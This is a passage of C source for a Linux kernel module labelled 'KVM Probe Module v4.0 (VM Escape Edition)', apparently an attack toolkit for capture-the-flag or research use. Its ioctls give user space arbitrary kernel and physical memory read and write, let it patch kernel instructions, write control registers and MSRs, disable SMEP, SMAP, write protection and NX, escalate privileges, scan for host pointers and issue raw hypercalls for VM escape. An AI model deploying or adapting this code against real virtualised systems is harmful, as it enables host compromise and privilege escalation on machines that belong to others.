            if (!va) {
                return -EINVAL;
            }

            if (is_kernel_address(va)) {
                pa = virt_to_phys((void *)va);
                return copy_to_user((void __user *)arg, &pa, sizeof(pa)) ? -EFAULT : 0;
            } else {
                return -EINVAL;
            }
        }

        case IOCTL_SCAN_VA: {
            struct va_scan_data va_req;
            void *src;
            unsigned char *tmp;
            unsigned long actual_addr;

            if (copy_from_user(&va_req, (struct va_scan_data __user *)arg, sizeof(va_req))) {
                return -EFAULT;
            }

            if (!va_req.va || !va_req.size || !va_req.user_buffer) {
                return -EINVAL;
            }

            actual_addr = apply_kaslr_slide(va_req.va);
            src = (void *)actual_addr;
            
            tmp = kmalloc(va_req.size, GFP_KERNEL);
            if (!tmp) {
                return -ENOMEM;
            }

            memcpy(tmp, src, va_req.size);

            if (copy_to_user(va_req.user_buffer, tmp, va_req.size)) {
                kfree(tmp);
                return -EFAULT;
            }

            kfree(tmp);
            trigger_hypercall();
            return 0;
        }

        case IOCTL_WRITE_VA: {
            struct va_write_data wa_req;
            unsigned long actual_addr;
            unsigned char *tmp;

            if (copy_from_user(&wa_req, (struct va_write_data __user *)arg, sizeof(wa_req))) {
                return -EFAULT;
            }

            if (!wa_req.va || !wa_req.size || !wa_req.user_buffer) {
                return -EINVAL;
            }

            actual_addr = apply_kaslr_slide(wa_req.va);

            tmp = kmalloc(wa_req.size, GFP_KERNEL);
            if (!tmp) {
                return -ENOMEM;
            }

            if (copy_from_user(tmp, wa_req.user_buffer, wa_req.size)) {
                kfree(tmp);
                return -EFAULT;
            }

            memcpy((void *)actual_addr, tmp, wa_req.size);
            kfree(tmp);
            trigger_hypercall();
            return 0;
        }

        case IOCTL_GET_CURRENT_TASK: {
            unsigned long current_task = (unsigned long)current;
            return copy_to_user((void __user *)arg, &current_task, sizeof(current_task)) ? -EFAULT : 0;
        }

        case IOCTL_READ_PHYSICAL: {
            struct physical_rw phys_req;
            unsigned char *kbuf;

            if (copy_from_user(&phys_req, (void __user *)arg, sizeof(phys_req))) {
                return -EFAULT;
            }

            if (!phys_req.phys_addr || !phys_req.size || !phys_req.user_buffer) {
                return -EINVAL;
            }

            kbuf = kmalloc(phys_req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (read_physical_memory(phys_req.phys_addr, kbuf, phys_req.size) < 0) {
                kfree(kbuf);
                return -EFAULT;
            }

            if (copy_to_user(phys_req.user_buffer, kbuf, phys_req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            kfree(kbuf);
            trigger_hypercall();
            return 0;
        }

        case IOCTL_WRITE_PHYSICAL: {
            struct physical_rw phys_req;
            unsigned char *kbuf;

            if (copy_from_user(&phys_req, (void __user *)arg, sizeof(phys_req))) {
                return -EFAULT;
            }

            if (!phys_req.phys_addr || !phys_req.size || !phys_req.user_buffer) {
                return -EINVAL;
            }

            kbuf = kmalloc(phys_req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, phys_req.user_buffer, phys_req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            if (write_physical_memory(phys_req.phys_addr, kbuf, phys_req.size) < 0) {
                kfree(kbuf);
                return -EFAULT;
            }

            kfree(kbuf);
            trigger_hypercall();
            return 0;
        }

        case IOCTL_ALLOC_ROOT_PAGES: {
            unsigned long __user *user_pages = (unsigned long __user *)arg;
            int count = 8;
            return alloc_root_pages(user_pages, count);
        }

        /* Protection control IOCTLs */
        case IOCTL_DISABLE_SMEP:
            disable_smep();
            return 0;

        case IOCTL_ENABLE_SMEP:
            enable_smep();
            return 0;

        case IOCTL_DISABLE_SMAP:
            disable_smap();
            return 0;

        case IOCTL_ENABLE_SMAP:
            enable_smap();
            return 0;

        case IOCTL_DISABLE_WP:
            disable_wp();
            return 0;

        case IOCTL_ENABLE_WP:
            enable_wp();
            return 0;

        case IOCTL_ENABLE_NX:
            enable_nx();
            return 0;

        case IOCTL_DISABLE_NX:
            disable_nx();
            return 0;

        case IOCTL_READ_CR0: {
#ifdef CONFIG_X86
            unsigned long cr0 = my_read_cr0();
            return copy_to_user((void __user *)arg, &cr0, sizeof(cr0)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_CR0: {
#ifdef CONFIG_X86
            unsigned long cr0;
            if (copy_from_user(&cr0, (void __user *)arg, sizeof(cr0))) {
                return -EFAULT;
            }
            my_write_cr0(cr0);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_CR4: {
#ifdef CONFIG_X86
            unsigned long cr4 = my_read_cr4();
            return copy_to_user((void __user *)arg, &cr4, sizeof(cr4)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_CR4: {
#ifdef CONFIG_X86
            unsigned long cr4;
            if (copy_from_user(&cr4, (void __user *)arg, sizeof(cr4))) {
                return -EFAULT;
            }
            my_write_cr4(cr4);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_CR2: {
#ifdef CONFIG_X86
            unsigned long cr2 = my_read_cr2();
            return copy_to_user((void __user *)arg, &cr2, sizeof(cr2)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_CR3: {
#ifdef CONFIG_X86
            unsigned long cr3 = my_read_cr3();
            return copy_to_user((void __user *)arg, &cr3, sizeof(cr3)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_CR3: {
#ifdef CONFIG_X86
            unsigned long cr3;
            if (copy_from_user(&cr3, (void __user *)arg, sizeof(cr3))) {
                return -EFAULT;
            }
            my_write_cr3(cr3);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_EFER: {
#ifdef CONFIG_X86
            u64 efer = my_rdmsr(MSR_EFER);
            return copy_to_user((void __user *)arg, &efer, sizeof(efer)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_EFER: {
#ifdef CONFIG_X86
            u64 efer;
            if (copy_from_user(&efer, (void __user *)arg, sizeof(efer))) {
                return -EFAULT;
            }
            my_wrmsr(MSR_EFER, efer);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_MSR: {
#ifdef CONFIG_X86
            struct msr_data msr_req;
            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
                return -EFAULT;
            }
            msr_req.value = my_rdmsr(msr_req.msr);
            return copy_to_user((void __user *)arg, &msr_req, sizeof(msr_req)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_MSR: {
#ifdef CONFIG_X86
            struct msr_data msr_req;
            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
                return -EFAULT;
            }
            my_wrmsr(msr_req.msr, msr_req.value);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_ESCALATE_PRIVILEGES:
            escalate_privileges();
            return 0;

        case IOCTL_CHECK_STATUS:
            return 0;

        case IOCTL_READ_FLAG_ADDR: {
            if (g_symbol_write_flag) {
                unsigned long val = *((unsigned long *)g_symbol_write_flag);
                return copy_to_user((void __user *)arg, &val, sizeof(val)) ? -EFAULT : 0;
            } else {
                return -ENOENT;
            }
        }

        case IOCTL_WRITE_FLAG_ADDR: {
            unsigned long val;
            if (g_symbol_write_flag) {
                if (copy_from_user(&val, (void __user *)arg, sizeof(val))) {
                    return -EFAULT;
                }
                *((unsigned long *)g_symbol_write_flag) = val;
                trigger_hypercall();
                return 0;
            } else {
                return -ENOENT;
            }
        }

        case IOCTL_PATCH_INSTRUCTIONS: {
            struct patch_req req;
            unsigned char *kbuf;
            unsigned long actual_addr;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.dst_va || !req.size || !req.user_buf || req.size > PAGE_SIZE) {
                return -EINVAL;
            }

            actual_addr = apply_kaslr_slide(req.dst_va);

            kbuf = kmalloc(req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buf, req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            memcpy((void *)actual_addr, kbuf, req.size);
            kfree(kbuf);
            trigger_hypercall();
            return 0;
        }

        /* New VM escape IOCTLs */
        case IOCTL_ALLOC_DMA_PAGES: {
            struct dma_alloc_req req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }
            return alloc_dma_pages(req.count, req.addrs);
        }

        case IOCTL_FREE_DMA_PAGES:
            free_dma_pages();
            return 0;

        case IOCTL_PROBE_MMIO_RANGE: {
            struct mmio_probe_req req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }
            return probe_mmio_range(&req);
        }

        case IOCTL_SCAN_HOST_PTRS: {
            struct host_ptr_scan scan;
            if (copy_from_user(&scan, (void __user *)arg, sizeof(scan))) {
                return -EFAULT;
            }
            return scan_for_host_ptrs(&scan);
        }

        case IOCTL_RAW_VMCALL: {
            struct hypercall_args args;
            if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
                return -EFAULT;
            }
            args.result = kvm_hypercall_vmcall(args.nr, args.arg0, args.arg1,
                                                args.arg2, args.arg3);
            if (copy_to_user((void __user *)arg, &args, sizeof(args))) {
                return -EFAULT;
            }
            return 0;
        }

        case IOCTL_RAW_VMMCALL: {
            struct hypercall_args args;
            if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
                return -EFAULT;
            }
            args.result = kvm_hypercall_vmmcall(args.nr, args.arg0, args.arg1,
                                                 args.arg2, args.arg3);
            if (copy_to_user((void __user *)arg, &args, sizeof(args))) {
                return -EFAULT;
            }
            return 0;
        }

        default:
            return -EINVAL;
    }

    return 0;
}

/* ========================================================================
 * File Operations
 * ======================================================================== */

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = driver_ioctl,
};

/* ========================================================================
 * Module Init/Exit
 * ======================================================================== */

static int __init mod_init(void) {
    int ret;

    printk(KERN_INFO "%s: Initializing KVM Probe Module v4.0 (VM Escape Edition)\n", DRIVER_NAME);

    /* Initialize protection tracking */
    g_original_cr4 = 0;
    g_original_cr0 = 0;
    g_original_efer = 0;
    g_smep_disabled = false;
    g_smap_disabled = false;
    g_wp_disabled = false;
    g_nx_enabled = false;

    /* Initialize kallsyms lookup */
    ret = kallsyms_lookup_init();
    if (ret < 0) {
        printk(KERN_WARNING "%s: kallsyms_lookup initialization failed\n", DRIVER_NAME);
    }

    /* Initialize KASLR slide */
    ret = init_kaslr_slide();
    if (ret < 0) {
        printk(KERN_WARNING "%s: KASLR slide detection failed\n", DRIVER_NAME);
    } else {
        printk(KERN_INFO "%s: KASLR slide: 0x%lx\n", DRIVER_NAME, g_kaslr_slide);
    }

    /* Cache important symbols */
    cache_important_symbols();

    /* Register character device */
    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) {
        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
        return major_num;
    }

    /* Create device class */
    driver_class = CLASS_CREATE_COMPAT(DRIVER_NAME);
    if (IS_ERR(driver_class)) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: class_create failed\n", DRIVER_NAME);
        return PTR_ERR(driver_class);
    }

    /* Create device */
    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) {
        class_destroy(driver_class);
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: device_create failed\n", DRIVER_NAME);
        return PTR_ERR(driver_device);
    }

    /* Initialize global state */
    g_vq_virt_addr = NULL;
    g_vq_phys_addr = 0;
    g_vq_pfn = 0;
    g_dma_page_count = 0;
    memset(g_dma_pages, 0, sizeof(g_dma_pages));
    memset(g_dma_addrs, 0, sizeof(g_dma_addrs));

    printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d\n",
           DRIVER_NAME, DEVICE_FILE_NAME, major_num);

    return 0;
}

static void __exit mod_exit(void) {
    printk(KERN_INFO "%s: Unloading KVM Probe Module\n", DRIVER_NAME);

    /* Restore protections */
    restore_protections();

    /* Free VQ page */
    if (g_vq_virt_addr) {
        free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
        g_vq_virt_addr = NULL;
    }

    /* Free DMA pages */
    free_dma_pages();

    /* Destroy device */
    if (driver_device) {
        device_destroy(driver_class, MKDEV(major_num, 0));
    }

    /* Destroy class */
    if (driver_class) {
        class_destroy(driver_class);
    }

    /* Unregister character device */
    if (major_num >= 0) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
    }

    printk(KERN_INFO "%s: Module unloaded\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit);